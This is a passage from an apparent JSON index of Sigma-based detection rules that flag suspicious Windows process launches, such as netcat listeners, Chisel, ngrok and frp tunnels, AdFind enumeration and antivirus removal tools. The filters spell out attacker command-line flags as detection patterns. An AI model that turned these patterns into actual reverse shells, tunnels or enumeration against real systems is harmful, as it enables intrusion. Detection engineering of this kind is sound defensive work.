"56ef1672d494888c0b28880b3add0a50a8274ecb26a0a313e8797407c90d3950"}, "0.2": {"digest": "b9efe2a153752541d99f87c0969b11046f0390d7501fb6a5f7ba34ca370c1910"}}}, "sigmahq/proc_creation_win_provlaunch_susp_child_process": {"content": "type: trigger\nname: sigmahq/proc_creation_win_provlaunch_susp_child_process\ndescription: |\n  Detects suspicious child processes of \"provlaunch.exe\" which might indicate potential abuse to proxy execution.\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && (evt.Parsed.ParentImage endsWith '\\\\provlaunch.exe' && (evt.Parsed.Image endsWith '\\\\calc.exe' || evt.Parsed.Image endsWith '\\\\cmd.exe' || evt.Parsed.Image endsWith '\\\\cscript.exe' || evt.Parsed.Image endsWith '\\\\mshta.exe' || evt.Parsed.Image endsWith '\\\\notepad.exe' || evt.Parsed.Image endsWith '\\\\powershell.exe' || evt.Parsed.Image endsWith '\\\\pwsh.exe' || evt.Parsed.Image endsWith '\\\\regsvr32.exe' || evt.Parsed.Image endsWith '\\\\rundll32.exe' || evt.Parsed.Image endsWith '\\\\wscript.exe' || evt.Parsed.Image contains ':\\\\PerfLogs\\\\' || evt.Parsed.Image contains ':\\\\Temp\\\\' || evt.Parsed.Image contains ':\\\\Users\\\\Public\\\\' || evt.Parsed.Image contains '\\\\AppData\\\\Temp\\\\' || evt.Parsed.Image contains '\\\\Windows\\\\System32\\\\Tasks\\\\' || evt.Parsed.Image contains '\\\\Windows\\\\Tasks\\\\' || evt.Parsed.Image contains '\\\\Windows\\\\Temp\\\\'))\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1218\n\n  label: \"Suspicious Provlaunch.EXE Child Process\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects suspicious child processes of \"provlaunch.exe\" which might indicate potential abuse to proxy execution.\n", "path": "scenarios/sigmahq/proc_creation_win_provlaunch_susp_child_process.yml", "version": "0.2", "versions": {"0.1": {"digest": "1effa2e4a941888b1000b2227ce17bf2d8cfbf1af40a61cbefc07491341104e8"}, "0.2": {"digest": "e09258447aa43161ef160e46f6ee3c4e6f4b7a8218c41e299a930323d8197f10"}}}, "sigmahq/proc_creation_win_pua_3proxy_execution": {"content": "type: trigger\nname: sigmahq/proc_creation_win_pua_3proxy_execution\ndescription: |\n  Detects the use of 3proxy, a tiny free proxy server\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && (evt.Parsed.Image endsWith '\\\\3proxy.exe' || evt.Parsed.Description == '3proxy - tiny proxy server' || evt.Parsed.CommandLine contains '.exe -i127.0.0.1 -p')\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1572\n\n  label: \"PUA - 3Proxy Execution\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects the use of 3proxy, a tiny free proxy server\n", "path": "scenarios/sigmahq/proc_creation_win_pua_3proxy_execution.yml", "version": "0.2", "versions": {"0.1": {"digest": "71bc9e346500c33e9f93e35e33b32b18e86cdc7f31ee8555a56bca2db91aa798"}, "0.2": {"digest": "be1a437cd3a80961615f107a17a62a299eafc5064daa822a8f66f3090168658a"}}}, "sigmahq/proc_creation_win_pua_adfind_enumeration": {"content": "type: trigger\nname: sigmahq/proc_creation_win_pua_adfind_enumeration\ndescription: |\n  Detects active directory enumeration activity using known AdFind CLI flags\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && (evt.Parsed.CommandLine contains 'lockoutduration' || evt.Parsed.CommandLine contains 'lockoutthreshold' || evt.Parsed.CommandLine contains 'lockoutobservationwindow' || evt.Parsed.CommandLine contains 'maxpwdage' || evt.Parsed.CommandLine contains 'minpwdage' || evt.Parsed.CommandLine contains 'minpwdlength' || evt.Parsed.CommandLine contains 'pwdhistorylength' || evt.Parsed.CommandLine contains 'pwdproperties' || evt.Parsed.CommandLine contains '-sc admincountdmp' || evt.Parsed.CommandLine contains '-sc exchaddresses')\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1087.002\n\n  label: \"PUA - Suspicious ActiveDirectory Enumeration Via AdFind.EXE\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects active directory enumeration activity using known AdFind CLI flags\n", "path": "scenarios/sigmahq/proc_creation_win_pua_adfind_enumeration.yml", "version": "0.2", "versions": {"0.1": {"digest": "062ba575d6391833ca3e6df1a83ff332299f8db467e191d465b92af6f5fa3ccd"}, "0.2": {"digest": "1343d2ce326fec1256969226403214aa9818e431b555a616d1cdb8fe351bd7cc"}}}, "sigmahq/proc_creation_win_pua_adfind_susp_usage": {"content": "type: trigger\nname: sigmahq/proc_creation_win_pua_adfind_susp_usage\ndescription: |\n  Detects AdFind execution with common flags seen used during attacks\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && (evt.Parsed.CommandLine contains 'domainlist' || evt.Parsed.CommandLine contains 'trustdmp' || evt.Parsed.CommandLine contains 'dcmodes' || evt.Parsed.CommandLine contains 'adinfo' || evt.Parsed.CommandLine contains ' dclist ' || evt.Parsed.CommandLine contains 'computer_pwdnotreqd' || evt.Parsed.CommandLine contains 'objectcategory=' || evt.Parsed.CommandLine contains '-subnets -f' || evt.Parsed.CommandLine contains 'name=\"Domain Admins\"' || evt.Parsed.CommandLine contains '-sc u:' || evt.Parsed.CommandLine contains 'domainncs' || evt.Parsed.CommandLine contains 'dompol' || evt.Parsed.CommandLine contains ' oudmp ' || evt.Parsed.CommandLine contains 'subnetdmp' || evt.Parsed.CommandLine contains 'gpodmp' || evt.Parsed.CommandLine contains 'fspdmp' || evt.Parsed.CommandLine contains 'users_noexpire' || evt.Parsed.CommandLine contains 'computers_active' || evt.Parsed.CommandLine contains 'computers_pwdnotreqd')\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1018\n   - attack.t1087.002\n   - attack.t1482\n   - attack.t1069.002\n\n  label: \"PUA - AdFind Suspicious Execution\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects AdFind execution with common flags seen used during attacks\n", "path": "scenarios/sigmahq/proc_creation_win_pua_adfind_susp_usage.yml", "version": "0.2", "versions": {"0.1": {"digest": "5607e1a45781c499521df4bc265e55ecaa8ea232ed84778f6f468ce23ff9b423"}, "0.2": {"digest": "3ac5b38a4870317e2353ee97e8cad53890f51e1ed38f364ae93ac058f8f57106"}}}, "sigmahq/proc_creation_win_pua_advancedrun_priv_user": {"content": "type: trigger\nname: sigmahq/proc_creation_win_pua_advancedrun_priv_user\ndescription: |\n  Detects the execution of AdvancedRun utility in the context of the TrustedInstaller, SYSTEM, Local Service or Network Service accounts\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && ((evt.Parsed.CommandLine contains '/EXEFilename' || evt.Parsed.CommandLine contains '/CommandLine') && (evt.Parsed.CommandLine contains ' /RunAs 8 ' || evt.Parsed.CommandLine contains ' /RunAs 4 ' || evt.Parsed.CommandLine contains ' /RunAs 10 ' || evt.Parsed.CommandLine contains ' /RunAs 11 ' || evt.Parsed.CommandLine endsWith '/RunAs 8' || evt.Parsed.CommandLine endsWith '/RunAs 4' || evt.Parsed.CommandLine endsWith '/RunAs 10' || evt.Parsed.CommandLine endsWith '/RunAs 11'))\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1134.002\n\n  label: \"PUA - AdvancedRun Suspicious Execution\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects the execution of AdvancedRun utility in the context of the TrustedInstaller, SYSTEM, Local Service or Network Service accounts\n", "path": "scenarios/sigmahq/proc_creation_win_pua_advancedrun_priv_user.yml", "version": "0.2", "versions": {"0.1": {"digest": "e70441e35abd4c849a1c460fe4e5e1949c559757b2bd8dc5647bc6ad4ae60f13"}, "0.2": {"digest": "cef6f1e754f9e89519694d4838f22f9ff66362eaf427a556e73f000755e9f773"}}}, "sigmahq/proc_creation_win_pua_chisel": {"content": "type: trigger\nname: sigmahq/proc_creation_win_pua_chisel\ndescription: |\n  Detects usage of the Chisel tunneling tool via the commandline arguments\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && (evt.Parsed.Image endsWith '\\\\chisel.exe' || (evt.Parsed.CommandLine contains 'exe client ' || evt.Parsed.CommandLine contains 'exe server ') && (evt.Parsed.CommandLine contains '-socks5' || evt.Parsed.CommandLine contains '-reverse' || evt.Parsed.CommandLine contains ' r:' || evt.Parsed.CommandLine contains ':127.0.0.1:' || evt.Parsed.CommandLine contains '-tls-skip-verify ' || evt.Parsed.CommandLine contains ':socks'))\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1090.001\n\n  label: \"PUA - Chisel Tunneling Tool Execution\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects usage of the Chisel tunneling tool via the commandline arguments\n", "path": "scenarios/sigmahq/proc_creation_win_pua_chisel.yml", "version": "0.2", "versions": {"0.1": {"digest": "33a0ee0ce4cc2c242586788d177b59de0bea62661fd1a2c892288b47fe93dba3"}, "0.2": {"digest": "f62964ed3f0587a77d351d044028612a82418bc761ec3522abdb673d23f13788"}}}, "sigmahq/proc_creation_win_pua_cleanwipe": {"content": "type: trigger\nname: sigmahq/proc_creation_win_pua_cleanwipe\ndescription: |\n  Detects the use of CleanWipe a tool usually used to delete Symantec antivirus.\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && (evt.Parsed.Image endsWith '\\\\SepRemovalToolNative_x64.exe' || evt.Parsed.Image endsWith '\\\\CATClean.exe' && evt.Parsed.CommandLine contains '--uninstall' || evt.Parsed.Image endsWith '\\\\NetInstaller.exe' && evt.Parsed.CommandLine contains '-r' || evt.Parsed.Image endsWith '\\\\WFPUnins.exe' && evt.Parsed.CommandLine contains '/uninstall' && evt.Parsed.CommandLine contains '/enterprise')\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1562.001\n\n  label: \"PUA - CleanWipe Execution\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects the use of CleanWipe a tool usually used to delete Symantec antivirus.\n", "path": "scenarios/sigmahq/proc_creation_win_pua_cleanwipe.yml", "version": "0.2", "versions": {"0.1": {"digest": "f29122bf5e1d44253983d7ebda6d1b02d9833b702234c471e98c65e4ff61fee1"}, "0.2": {"digest": "f41e560f2dc5839a92618eaf55d8330116d5c16f50dcd2e09b93500293b05df2"}}}, "sigmahq/proc_creation_win_pua_crassus": {"content": "type: trigger\nname: sigmahq/proc_creation_win_pua_crassus\ndescription: |\n  Detects Crassus, a Windows privilege escalation discovery tool, based on PE metadata characteristics.\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && (evt.Parsed.Image endsWith '\\\\Crassus.exe' || evt.Parsed.OriginalFileName == 'Crassus.exe' || evt.Parsed.Description contains 'Crassus')\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1590.001\n\n  label: \"PUA - Crassus Execution\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects Crassus, a Windows privilege escalation discovery tool, based on PE metadata characteristics.\n", "path": "scenarios/sigmahq/proc_creation_win_pua_crassus.yml", "version": "0.2", "versions": {"0.1": {"digest": "3f7f508f22922a3d95f03896a9a37f0c3f929c0b5606a74574a15c230f42459b"}, "0.2": {"digest": "fd685471757d0562b5e2a9d3b7d764c6342deff36821ec75023b6fefe777b38f"}}}, "sigmahq/proc_creation_win_pua_csexec": {"content": "type: trigger\nname: sigmahq/proc_creation_win_pua_csexec\ndescription: |\n  Detects the use of the lesser known remote execution tool named CsExec a PsExec alternative\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && (evt.Parsed.Image endsWith '\\\\csexec.exe' || evt.Parsed.Description == 'csexec')\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1587.001\n   - attack.t1569.002\n\n  label: \"PUA - CsExec Execution\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects the use of the lesser known remote execution tool named CsExec a PsExec alternative\n", "path": "scenarios/sigmahq/proc_creation_win_pua_csexec.yml", "version": "0.2", "versions": {"0.1": {"digest": "76ea21cf01314ff20174323539fdeea0931d4413009ea37940c2ee3c0a5bdbed"}, "0.2": {"digest": "a5632d871b43490e5fdb5887c289ee704a29ea612780ab246f4391b6a800945b"}}}, "sigmahq/proc_creation_win_pua_defendercheck": {"content": "type: trigger\nname: sigmahq/proc_creation_win_pua_defendercheck\ndescription: |\n  Detects the use of DefenderCheck, a tool to evaluate the signatures used in Microsoft Defender. It can be used to figure out the strings / byte chains used in Microsoft Defender to detect a tool and thus used for AV evasion.\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && (evt.Parsed.Image endsWith '\\\\DefenderCheck.exe' || evt.Parsed.Description == 'DefenderCheck')\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1027.005\n\n  label: \"PUA - DefenderCheck Execution\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects the use of DefenderCheck, a tool to evaluate the signatures used in Microsoft Defender. It can be used to figure out the strings / byte chains used in Microsoft Defender to detect a tool and thus used for AV evasion.\n", "path": "scenarios/sigmahq/proc_creation_win_pua_defendercheck.yml", "version": "0.2", "versions": {"0.1": {"digest": "0166732739498b99dc3e3c8391c61b5eb6483af97ecec91ef9f09cc11478eccd"}, "0.2": {"digest": "d0a0e82b1d64fce5f11b914602354ae1a6865aa2387ab98e6fc20ed01e1cf5b3"}}}, "sigmahq/proc_creation_win_pua_ditsnap": {"content": "type: trigger\nname: sigmahq/proc_creation_win_pua_ditsnap\ndescription: |\n  Detects the use of Ditsnap tool, an inspection tool for Active Directory database, ntds.dit.\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && (evt.Parsed.Image endsWith '\\\\ditsnap.exe' || evt.Parsed.CommandLine contains 'ditsnap.exe')\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1003.003\n\n  label: \"PUA - DIT Snapshot Viewer\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects the use of Ditsnap tool, an inspection tool for Active Directory database, ntds.dit.\n", "path": "scenarios/sigmahq/proc_creation_win_pua_ditsnap.yml", "version": "0.2", "versions": {"0.1": {"digest": "51a803a58c20a12e2ecfcd0b2fb65fb95ad6f882dac6d438cabfabe87bedbacd"}, "0.2": {"digest": "7bcba3151674cc1a9edbdf67b9e1928f4f899cc9a6c21bb0c411e923e58c445a"}}}, "sigmahq/proc_creation_win_pua_frp": {"content": "type: trigger\nname: sigmahq/proc_creation_win_pua_frp\ndescription: |\n  Detects the use of Fast Reverse Proxy. frp is a fast reverse proxy to help you expose a local server behind a NAT or firewall to the Internet.\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && (evt.Parsed.Image endsWith '\\\\frpc.exe' || evt.Parsed.Image endsWith '\\\\frps.exe' || evt.Parsed.CommandLine contains '\\\\frpc.ini' || evt.Parsed.Hashes contains 'MD5=7D9C233B8C9E3F0EA290D2B84593C842' || evt.Parsed.Hashes contains 'SHA1=06DDC9280E1F1810677935A2477012960905942F' || evt.Parsed.Hashes contains 'SHA256=57B0936B8D336D8E981C169466A15A5FD21A7D5A2C7DAF62D5E142EE860E387C' || evt.Parsed.md5 == '7d9c233b8c9e3f0ea290d2b84593c842' || evt.Parsed.sha1 == '06ddc9280e1f1810677935a2477012960905942f' || evt.Parsed.sha256 == '57b0936b8d336d8e981c169466a15a5fd21a7d5a2c7daf62d5e142ee860e387c')\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1090\n\n  label: \"PUA - Fast Reverse Proxy (FRP) Execution\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects the use of Fast Reverse Proxy. frp is a fast reverse proxy to help you expose a local server behind a NAT or firewall to the Internet.\n", "path": "scenarios/sigmahq/proc_creation_win_pua_frp.yml", "version": "0.2", "versions": {"0.1": {"digest": "6d2421168037d842ffd299a69756fe282f36fbc859938f91c7e43f12407d0604"}, "0.2": {"digest": "e7fafccf5a6b21d5a2f5117bdcb1678855ff461da1ce5c0c4251e334a01b685b"}}}, "sigmahq/proc_creation_win_pua_iox": {"content": "type: trigger\nname: sigmahq/proc_creation_win_pua_iox\ndescription: |\n  Detects the use of IOX - a tool for port forwarding and intranet proxy purposes\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && (evt.Parsed.Image endsWith '\\\\iox.exe' || evt.Parsed.CommandLine contains '.exe fwd -l ' || evt.Parsed.CommandLine contains '.exe fwd -r ' || evt.Parsed.CommandLine contains '.exe proxy -l ' || evt.Parsed.CommandLine contains '.exe proxy -r ' || evt.Parsed.Hashes contains 'MD5=9DB2D314DD3F704A02051EF5EA210993' || evt.Parsed.Hashes contains 'SHA1=039130337E28A6623ECF9A0A3DA7D92C5964D8DD' || evt.Parsed.Hashes contains 'SHA256=C6CF82919B809967D9D90EA73772A8AA1C1EB3BC59252D977500F64F1A0D6731' || evt.Parsed.md5 == '9db2d314dd3f704a02051ef5ea210993' || evt.Parsed.sha1 == '039130337e28a6623ecf9a0a3da7d92c5964d8dd' || evt.Parsed.sha256 == 'c6cf82919b809967d9d90ea73772a8aa1c1eb3bc59252d977500f64f1a0d6731')\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1090\n\n  label: \"PUA- IOX Tunneling Tool Execution\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects the use of IOX - a tool for port forwarding and intranet proxy purposes\n", "path": "scenarios/sigmahq/proc_creation_win_pua_iox.yml", "version": "0.2", "versions": {"0.1": {"digest": "79cdb7e88be7d6036e6acd47d5446ff1874ecf9a394fba20a921e8a5bf3cd2fd"}, "0.2": {"digest": "8bd4f182d4369fe7bfd112163dfdca20aa06ea751437571310c749e694aa04ad"}}}, "sigmahq/proc_creation_win_pua_netcat": {"content": "type: trigger\nname: sigmahq/proc_creation_win_pua_netcat\ndescription: |\n  Detects execution of Netcat. Adversaries may use a non-application layer protocol for communication between host and C2 server or among infected hosts within a network\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && (evt.Parsed.Image endsWith '\\\\nc.exe' || evt.Parsed.Image endsWith '\\\\ncat.exe' || evt.Parsed.Image endsWith '\\\\netcat.exe' || evt.Parsed.CommandLine contains ' -lvp ' || evt.Parsed.CommandLine contains ' -lvnp' || evt.Parsed.CommandLine contains ' -l -v -p ' || evt.Parsed.CommandLine contains ' -lv -p ' || evt.Parsed.CommandLine contains ' -l --proxy-type http ' || evt.Parsed.CommandLine contains ' -vnl --exec ' || evt.Parsed.CommandLine contains ' -vnl -e ' || evt.Parsed.CommandLine contains ' --lua-exec ' || evt.Parsed.CommandLine contains ' --sh-exec ')\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1095\n\n  label: \"PUA - Netcat Suspicious Execution\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects execution of Netcat. Adversaries may use a non-application layer protocol for communication between host and C2 server or among infected hosts within a network\n", "path": "scenarios/sigmahq/proc_creation_win_pua_netcat.yml", "version": "0.2", "versions": {"0.1": {"digest": "7a816d111ed718a6da17ebb9193577e161b34a302b5de73a6a8f28384a409a14"}, "0.2": {"digest": "5a183d7bff17bfdb78ce84123289c47872cb08a122e266b8a47acba0d7501d7d"}}}, "sigmahq/proc_creation_win_pua_ngrok": {"content": "type: trigger\nname: sigmahq/proc_creation_win_pua_ngrok\ndescription: |\n  Detects the use of Ngrok, a utility used for port forwarding and tunneling, often used by threat actors to make local protected services publicly available. Involved domains are bin.equinox.io for download and *.ngrok.io for connections. \nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && (evt.Parsed.CommandLine contains ' tcp 139' || evt.Parsed.CommandLine contains ' tcp 445' || evt.Parsed.CommandLine contains ' tcp 3389' || evt.Parsed.CommandLine contains ' tcp 5985' || evt.Parsed.CommandLine contains ' tcp 5986' || evt.Parsed.CommandLine contains ' start ' && evt.Parsed.CommandLine contains '--all' && evt.Parsed.CommandLine contains '--config' && evt.Parsed.CommandLine contains '.yml' || evt.Parsed.Image endsWith 'ngrok.exe' && (evt.Parsed.CommandLine contains ' tcp ' || evt.Parsed.CommandLine contains ' http ' || evt.Parsed.CommandLine contains ' authtoken ') || evt.Parsed.CommandLine contains '.exe authtoken ' || evt.Parsed.CommandLine contains '.exe start --all')\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1572\n\n  label: \"PUA - Ngrok Execution\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects the use of Ngrok, a utility used for port forwarding and tunneling, often used by threat actors to make local protected services publicly available. Involved domains are bin.equinox.io for download and *.ngrok.io for connections. \n", "path": "scenarios/sigmahq/proc_creation_win_pua_ngrok.yml", "version": "0.2", "versions": {"0.1": {"digest": "50e827e7b4e52a7a1acd169f297c86720140168d9a9befb1cf801d93785ba9de"}, "0.2": {"digest": "41b477efc482006e2411b629b0a93e18cad24ffbbf0b4eef49430802b8d64eb8"}}}, "sigmahq/proc_creation_win_pua_nimgrab": {"content": "type: trigger\nname: sigmahq/proc_creation_win_pua_nimgrab\ndescription: |\n  Detects the usage of nimgrab, a tool bundled with the Nim programming framework and used for downloading files.\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && (evt.Parsed.Image endsWith '\\\\nimgrab.exe' || evt.Parsed.Hashes contains 'MD5=2DD44C3C29D667F5C0EF5F9D7C7FFB8B' || evt.Parsed.Hashes contains 'SHA256=F266609E91985F0FE3E31C5E8FAEEEC4FFA5E0322D8B6F15FE69F4C5165B9559' || evt.Parsed.Hashes contains 'IMPHASH=C07FDDD21D123EA9B3A08EEF44AAAC45' || evt.Parsed.md5 == '2DD44C3C29D667F5C0EF5F9D7C7FFB8B' || evt.Parsed.sha256 == 'F266609E91985F0FE3E31C5E8FAEEEC4FFA5E0322D8B6F15FE69F4C5165B9559' || evt.Parsed.Imphash == 'C07FDDD21D123EA9B3A08EEF44AAAC45')\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1105\n\n  label: \"PUA - Nimgrab Execution\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects the usage of nimgrab, a tool bundled with the Nim programming framework and used for downloading files.\n", "path": "scenarios/sigmahq/proc_creation_win_pua_nimgrab.yml", "version": "0.2", "versions": {"0.1": {"digest": "08d637dc525b4c8b91b26a11858c92f3189d532ace4b11429fa53bcffbdfc0fa"}, "0.2": {"digest": "b0834a0856e037ca9ffe9733275ed23c106f1bd3e61fe688c0855de62fc6c539"}}}, "sigmahq/proc_creation_win_pua_nircmd_as_system": {"content": "type: trigger\nname: sigmahq/proc_creation_win_pua_nircmd_as_system\ndescription: |\n  Detects the use of NirCmd tool for command execution as SYSTEM user\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && (evt.Parsed.CommandLine contains ' runassystem ')\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1569.002\n\n  label: \"PUA - NirCmd Execution As LOCAL SYSTEM\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects the use of NirCmd tool for command execution as SYSTEM user\n", "path": "scenarios/sigmahq/proc_creation_win_pua_nircmd_as_system.yml", "version": "0.2", "versions": {"0.1": {"digest": "e841d7a634f35747c390b5a4c91be0af2bfd00d0ad67344b20e7c7c6437d2b82"}, "0.2": {"digest": "4194f655e91732d80137685b2397cbbaae4945acbc25aab00b622b5aa87074f4"}}}, "sigmahq/proc_creation_win_pua_nps": {"content": "type: trigger\nname: sigmahq/proc_creation_win_pua_nps\ndescription: |\n  Detects the use of NPS, a port forwarding and intranet penetration proxy server\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && (evt.Parsed.Image endsWith '\\\\npc.exe' || evt.Parsed.CommandLine contains ' -server=' && evt.Parsed.CommandLine contains ' -vkey=' && evt.Parsed.CommandLine contains ' -password=' || evt.Parsed.CommandLine contains ' -config=npc' || evt.Parsed.Hashes contains 'MD5=AE8ACF66BFE3A44148964048B826D005' || evt.Parsed.Hashes contains 'SHA1=CEA49E9B9B67F3A13AD0BE1C2655293EA3C18181' || evt.Parsed.Hashes contains 'SHA256=5A456283392FFCEEEACA3D3426C306EB470304637520D72FED1CC1FEBBBD6856' || evt.Parsed.md5 == 'ae8acf66bfe3a44148964048b826d005' || evt.Parsed.sha1 == 'cea49e9b9b67f3a13ad0be1c2655293ea3c18181' || evt.Parsed.sha256 == '5a456283392ffceeeaca3d3426c306eb470304637520d72fed1cc1febbbd6856')\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1090\n\n  label: \"PUA - NPS Tunneling Tool Execution\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects the use of NPS, a port forwarding and intranet penetration proxy server\n", "path": "scenarios/sigmahq/proc_creation_win_pua_nps.yml", "version": "0.2", "versions": {"0.1": {"digest": "8e83def0079df47d3110383a23be90a3e3c73e93508efa35c5b13ce461483b9e"}, "0.2": {"digest": "49997401a563f176b1fe8f8ca86db363ec4216b0cf3f730b8acdd7d757051d2c"}}}, "sigmahq/proc_creation_win_pua_nsudo": {"content": "type: trigger\nname: sigmahq/proc_creation_win_pua_nsudo\ndescription: |\n  Detects the use of NSudo tool for command execution\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && ((evt.Parsed.Image endsWith '\\\\NSudo.exe' || evt.Parsed.Image endsWith '\\\\NSudoLC.exe' || evt.Parsed.Image endsWith '\\\\NSudoLG.exe' || evt.Parsed.OriginalFileName in ['NSudo.exe', 'NSudoLC.exe', 'NSudoLG.exe']) && (evt.Parsed.CommandLine contains '-U:S ' || evt.Parsed.CommandLine contains '-U:T ' || evt.Parsed.CommandLine contains '-U:E ' || evt.Parsed.CommandLine contains '-P:E ' || evt.Parsed.CommandLine contains '-M:S ' || evt.Parsed.CommandLine contains '-M:H ' || evt.Parsed.CommandLine contains '-U=S ' || evt.Parsed.CommandLine contains '-U=T ' || evt.Parsed.CommandLine contains '-U=E ' || evt.Parsed.CommandLine contains '-P=E ' || evt.Parsed.CommandLine contains '-M=S ' || evt.Parsed.CommandLine contains '-M=H ' || evt.Parsed.CommandLine contains '-ShowWindowMode:Hide'))\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1569.002\n\n  label: \"PUA - NSudo Execution\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects the use of NSudo tool for command execution\n", "path": "scenarios/sigmahq/proc_creation_win_pua_nsudo.yml", "version": "0.2", "versions": {"0.1": {"digest": "8122a75c8104c7122dc2da0a12030e777280c2e907940cdbea853083007d7550"}, "0.2": {"digest": "3782dc38069857874ae0f14a7f52e32ecd11bf1218a77094c000e8b0ddc7be83"}}}, "sigmahq/proc_creation_win_pua_rclone_execution": {"content": "type: trigger\nname: 